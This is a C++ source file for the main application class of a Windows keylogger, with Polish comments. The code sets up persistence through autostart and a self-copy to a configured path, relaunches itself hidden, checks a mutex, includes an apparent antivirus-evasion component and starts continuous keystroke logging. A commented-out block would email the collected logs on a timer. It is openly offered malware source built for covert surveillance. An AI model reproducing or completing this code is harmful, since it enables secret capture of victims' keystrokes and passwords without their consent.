#include "Application.h"


Application::Application(string fileName) {
    this->config = new Config();
    this->keylogger = new Keylogger();
    this->time = new TimeLog();
    this->log = new Log();
    this->mailAccontTmp = new MailAccont();
    this->antyAV = new antyAv();
    this->keyloggerFileName = fileName;
    this->autorun = new Autorun(this->getKeyloggerFileName());
    this->newWinApix = new newWinApi();
}

void Application::start() {
    if (this->isMultiRun()) {
        exit(EXIT_SUCCESS);
    } else {
        //autorun
        this->autorun->addAutostart();
        Sleep(1000);
        cout << "Dodano autostart" << endl;
        cout << this->autorun->isCopyFile();
        cout << "Przekopiowano" << endl;
        Sleep(1000);
        if (this->keyloggerFileName != this->config->GetRegFilePath()) {
            //nie uruchomiono ze skopiowanej sciezki
            this->newWinApix->UruchomPlik()(this->StringToLPCTSTR(this->config->GetRegFilePath()), SW_HIDE);
            exit(EXIT_SUCCESS);
        }

        this->running();
    }
}

void Application::stop() {
    exit(EXIT_SUCCESS);
}

void Application::running() {
    cout << "Uruchomiono keyloggera" << endl;
    this->keylogger->startLogging();
    while (true) {
        Sleep(100);
//        if (this->time->compareTime()) {
//            Mail *mail = new Mail(this->mailAccontTmp->getPlainAccount());
//            this->log->prepareSendLog();
//            cout << "proba wyslania";
//            if (mail->sendMail(this->config->getEmailSubject(), "tresc", true, "tmp.html")) {
//                remove("tmp.html");
//                this->time->saveFileTime();
//                cout << "[" << this->time->getNowTime() << "] Logi wyslano!" << endl; //DEBUG
//            } else {
//                Sleep(100);
//                cout << "nie wyslano";
//            }
//
//        }
    }
}

bool Application::isMultiRun() {
    CreateMutex(NULL, TRUE, this->StringToLPCTSTR(this->config->GetMutexRunKey()));
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        //application is running
        return true;
    } else {
        //first run application
        return false;
    }
}

LPCTSTR Application::StringToLPCTSTR(string str) {
    //string to LPCTSTR
    LPTSTR lptstrConvertTmp = new TCHAR[str.size() + 1];
    strcpy(lptstrConvertTmp, str.c_str());
    return lptstrConvertTmp;
}

string Application::getKeyloggerFileName() {
    return this->keyloggerFileName;
}